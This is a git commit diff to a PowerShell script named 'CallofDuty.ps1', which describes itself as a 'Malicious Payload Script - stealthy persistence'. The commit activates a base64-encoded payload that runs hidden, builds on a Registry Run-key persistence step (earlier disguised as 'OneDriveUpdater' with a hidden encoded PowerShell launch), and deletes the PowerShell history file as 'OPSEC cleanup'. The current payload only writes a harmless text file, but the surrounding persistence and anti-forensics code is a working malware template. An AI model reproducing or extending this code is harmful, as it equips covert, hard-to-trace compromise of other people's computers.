f0168dd04ac1411c15a25255e243e1c1a483c7cf
raymondgonsalves <raymondagonsalves@gmail.com>
2025-04-03 01:44:35 -0400

    Update CallofDuty.ps1

--- CallofDuty.ps1
+++ CallofDuty.ps1
@@ -1,18 +1,7 @@
 # Malicious Payload Script - stealthy persistence
-$payload = 'Set-Content -Path "$env:TEMP\sysinfo.txt" -Value "Hello again Old Friend"; Start-Process notepad "$env:TEMP\sysinfo.txt" '
-#-WindowStyle Hidden'
+$payload = 'Set-Content -Path "$env:TEMP\sysinfo.txt" -Value "Hello again Old Friend"; Start-Process notepad "$env:TEMP\sysinfo.txt" -WindowStyle Hidden'
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
 $encodedPayload = [Convert]::ToBase64String($bytes)
-
-Write-Host $encodedPayload
-
-# Persistence via Registry (Stealthy) 
-<# New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
--Name "OneDriveUpdater" `
--Value "powershell.exe -nop -windowstyle hidden `
--encodedcommand $encodedPayload" `
--PropertyType String -Force
-
 
 # Define the registry path
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -35,4 +24,4 @@ $encodedPayload"
 # Clear history (OPSEC cleanup) Clear-History
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
-#>
+
